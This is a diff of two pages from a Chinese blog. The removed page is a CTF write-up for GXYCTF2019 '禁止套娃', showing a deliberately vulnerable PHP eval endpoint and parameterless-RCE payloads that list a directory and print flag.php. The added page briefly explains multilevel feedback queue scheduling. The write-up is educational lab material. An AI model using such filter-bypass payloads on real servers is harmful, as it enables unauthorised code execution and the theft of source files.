@@ -24,7 +24,7 @@
 
   
 
-  <title>git泄露-[GXYCTF2019]禁止套娃 | Molls&#39; blog</title>
+  <title>多级反馈队列调度 | Molls&#39; blog</title>
 
   
 
@@ -98,22 +98,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">git泄露-[GXYCTF2019]禁止套娃</h1>
+          <h1 class="title-wrap">多级反馈队列调度</h1>
           <h2 class="title-sub-wrap">
             <strong>molls</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-10-11T11:38:56.738Z" itemprop="datePublished">2021-10-11</time>
+            <time  class="article-date" datetime="2022-04-23T13:55:48.318Z" itemprop="datePublished">2022-04-23</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/%E5%AE%89%E5%85%A8/">📒 安全</a></li>
+    <li><a href="/categories/%E5%AD%A6%E7%A7%91/">📒 学科</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/git%E6%B3%84%E9%9C%B2/">🏷️ git泄露</a></li>
-  
-    <li><a href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">🏷️ 无参数RCE</a></li>
+    <li><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">🏷️ 操作系统</a></li>
   
 </ul>
         </div>
@@ -137,22 +135,10 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">题目来源</a></p>
-<p>这题涉及到<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119150960">.git源码泄露</a>和<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%951%EF%BC%9Agetenv">无参数RCE</a></p>
-<p>通过git泄露，下载源码，如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;<span class="comment">//表达式中使用 &quot;(?R)&quot; 来表示嵌套部分，后面的问号是匹配子表达式零次或一次</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>分析代码，通过GET传参，过滤了几个常用的伪协议，这里选择无参数绕过。</p>
-<p>首先查看当前目录下文件，构建payload</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">current</span>(<span class="params">localeconv</span>()</span>)));</span><br></pre></td></tr></table></figure>
-<p>这里对上述函数进行一些解释</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">localconv</span><span class="params">()</span></span>:函数返回一包含本地数字及货币格式信息的数组，数组第一项是.</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span>/pos():函数返回数组中的当前元素，初始指向第一个元素。</span><br><span class="line">所以current(localeconv())==<span class="string">&#x27;.&#x27;</span>  （永远是点）</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">(<span class="string">&#x27;.&#x27;</span>)</span></span>:列出当前目录中的文件和目录。</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/006874f7878b4dcfa07fc1b0d1e1c154.png" alt="在这里插入图片描述"></p>
-<p>然后我们读取flag.php文件中的内容，可以对这个数组进行反转后读取下一个，构造payload如下：</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show<span class="constructor">_source(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">pos</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>
-<p>对上述函数做解释如下：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span>:将原数组中的元素顺序反转，创建新的数组并返回。</span><br><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span>:函数将内部指针指向数组的下一个元素，并输出。</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51684648/article/details/120133848">更多参考1</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cainiao17441898/article/details/117158702">更多参考2</a></p>
+        <h2 id="多级反馈队列调度"><a href="#多级反馈队列调度" class="headerlink" title="多级反馈队列调度"></a>多级反馈队列调度</h2><h3 id="抢占方式"><a href="#抢占方式" class="headerlink" title="抢占方式"></a>抢占方式</h3><p>如果优先级高的队列上有进程进入，即使其他队列的进程执行到一半也要将资源让出来（停止执行该进程，并将该进程放到该队列的末尾），转而执行优先级高的队列上的进程。</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iR4y1K7pJ?spm_id_from=333.1007.top_right_bar_window_history.content.click">视频讲解</a></p>
+<h3 id="非抢占方式"><a href="#非抢占方式" class="headerlink" title="非抢占方式"></a>非抢占方式</h3><p>如果当前有进程在运行，即使优先级高（比正在运行的进程所在的队列的优先级高）的队列上有线程进入，仍旧继续执行当前的进程。只有当当前进程执行完后才去考虑队列的优先级。</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1o44y137eJ?spm_id_from=333.788.top_right_bar_window_history.content.click">视频讲解</a></p>
 
       </section>
 
@@ -160,28 +146,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2021/10/12/The%20mystery%20of%20ip/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">BJDCTF2020 The mystery of ip 1</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2021/10/11/WEB-INFweb%E3%80%82xml%E6%B3%84%E9%9C%B2-%5BRoarCTF%202019%5DEasy%20Java/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">WEB-INFweb.xml泄露-[RoarCTF 2019]Easy Java</h2>
+        <a href="/2022/04/10/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/JFinal%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84404%E7%95%8C%E9%9D%A2(IDEA)/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">JFinal配置自定义的404界面(IDEA)</h2>
         </a>
       
       <div class="card-text--row">Older</div>
@@ -242,6 +214,18 @@
 </section>
 
       
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%BA%A7%E5%8F%8D%E9%A6%88%E9%98%9F%E5%88%97%E8%B0%83%E5%BA%A6"><span class="toc-number">1.</span> <span class="toc-text">多级反馈队列调度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A2%E5%8D%A0%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">抢占方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E6%8A%A2%E5%8D%A0%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">非抢占方式</span></a></li></ol></li></ol>
+  </div>
+</section>
+
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
